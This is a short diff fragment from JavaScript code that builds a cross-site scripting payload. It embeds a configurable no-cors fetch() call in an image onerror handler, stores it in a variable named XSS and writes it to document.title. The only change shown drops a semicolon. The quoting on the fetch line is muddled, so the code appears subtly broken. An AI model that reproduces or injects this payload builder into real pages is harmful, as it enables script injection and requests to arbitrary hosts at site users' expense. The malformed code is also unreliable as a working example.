@@ -20,7 +20,7 @@
         "mode": "no-cors"
       };
 
-      var fetchString = fetch("' + url + '", {method: "' + method + '", body: ' + body + ', headers: ' + JSON.stringify(headers) + '});
+      var fetchString = fetch("' + url + '", {method: "' + method + '", body: ' + body + ', headers: ' + JSON.stringify(headers) + '})
       var XSS = '<img src="adfdsa" onerror=' + fetchString + '/>';
 
       document.title = XSS;
